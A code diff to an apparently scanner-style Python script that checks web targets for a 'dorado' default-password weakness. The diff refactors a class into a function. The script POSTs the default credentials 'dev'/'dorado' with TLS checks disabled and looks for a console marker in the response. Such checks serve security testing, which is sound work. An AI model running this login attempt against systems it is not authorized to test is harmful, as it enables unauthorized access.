@@ -10,13 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-class default_passwd_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['dorado默认口令漏洞', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -31,7 +25,7 @@ class default_passwd_BaseVerify:
             "user":"dev",
             "password":"dorado"
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"console.showSystemInfo.d" in req.text:
@@ -52,5 +46,5 @@ class default_passwd_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = default_passwd_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
